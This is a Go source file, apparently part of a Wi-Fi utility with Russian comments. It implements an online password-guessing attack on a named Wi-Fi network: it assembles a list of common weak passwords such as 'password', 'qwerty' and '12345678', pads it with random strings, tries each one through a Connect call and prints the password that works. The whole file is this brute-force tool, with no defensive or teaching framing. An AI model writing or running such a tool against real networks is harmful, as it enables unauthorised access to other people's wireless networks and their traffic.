package WiFi

import (
	"fmt"
	"math/rand"
	"strconv"
	"time"
)

// GeneratePasswords генерирует список случайных паролей переменной длины от 8 до 16 символов
func GeneratePasswords(count int, usedPasswords map[string]bool) []string {
	passwords := make([]string, 0, count)
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano())
	for len(passwords) < count {
		passwordLength := rand.Intn(9) + 8 // Случайное число от 8 до 16
		password := make([]byte, passwordLength)
		for j := range password {
			password[j] = charset[rand.Intn(len(charset))]
		}
		passwordStr := string(password)
		if !usedPasswords[passwordStr] {
			usedPasswords[passwordStr] = true
			passwords = append(passwords, passwordStr)
		}
	}
	return passwords
}

// GeneratePasswordWithPatterns генерирует пароли на основе различных шаблонов
func GeneratePasswordWithPatterns(count int, usedPasswords map[string]bool) []string {
	passwords := make([]string, 0, count)
	patterns := []string{
		"12344321", "12345678", "123456789", "password", "qwerty", "letmein", "admin", "welcome", "monkey", "abc123", "iloveyou",
		"12345678", "87654321", "password1", "passw0rd", "123123123", "111111111", "1q2w3e4r", "qwertyuiop", "asdfghjkl",
	}
	for _, pattern := range patterns {
		if !usedPasswords[pattern] {
			usedPasswords[pattern] = true
			passwords = append(passwords, pattern)
		}
		if len(passwords) >= count {
			break
		}
	}
	return passwords
}

// AttemptConnectWithGeneratedPasswords пытается подключиться к Wi-Fi сети с угадыванием пароля,
func AttemptConnectWithGeneratedPasswords(ssid string, attemptsStr string) {
	var passwordList []string
	attempts, err := strconv.Atoi(attemptsStr)
	if err != nil {
		fmt.Println("Ошибка преобразования количества попыток:", err)
		return
	}
	if attempts <= 0 {
		fmt.Println("Невозможно выполнить нулевое количество попыток.")
		return
	}
	if attempts > 1_000_000 {
		fmt.Println("Максимальное количество попыток не должно превышать 1 миллион.")
		return
	}

	usedPasswords := make(map[string]bool)

	// Добавляем простые пароли
	simplePasswords := []string{"12345678", "123456789", "1234567890", "12344321", "12345678", "123456789", "password", "qwerty", "letmein", "admin", "welcome", "monkey", "abc123", "iloveyou",
		"12345678", "87654321", "password1", "passw0rd", "123123123", "111111111", "1q2w3e4r", "qwertyuiop", "asdfghjkl",
	}
	for _, password := range simplePasswords {
		if !usedPasswords[password] {
			usedPasswords[password] = true
			passwordList = append(passwordList, password)
		}
	}

	// Добавляем популярные пароли
	popularPasswords := GeneratePasswordWithPatterns(20, usedPasswords)
	passwordList = append(passwordList, popularPasswords...)

	// Если количество попыток меньше или равно длине текущего списка паролей
	if attempts <= len(passwordList) {
		passwordList = passwordList[:attempts]
	} else {
		// Добавляем сгенерированные пароли
		generatedPasswords := GeneratePasswords(attempts-len(passwordList), usedPasswords)
		passwordList = append(passwordList, generatedPasswords...)
	}

	AttemptConnect(ssid, attempts, passwordList)
}

// AttemptConnect функция для автоматической попытки подключения к Wi-Fi с угадыванием пароля
func AttemptConnect(ssid string, attempts int, passwordList []string) {
	for i, password := range passwordList {
		if i >= attempts {
			fmt.Println("Достигнуто максимальное количество попыток.")
			break
		}
		fmt.Printf("Попытка %d: Подключение к %s с паролем %s\n", i+1, ssid, password)
		success := Connect(ssid, password)
		if success {
			fmt.Printf("Успешное подключение! Пароль: %s\n", password)
			break
		} else {
			fmt.Printf("Не удалось подключиться с паролем: %s\n", password)
		}
		time.Sleep(100 * time.Millisecond) // Задержка между попытками
	}
	fmt.Println("Все попытки подключения завершены.")
}
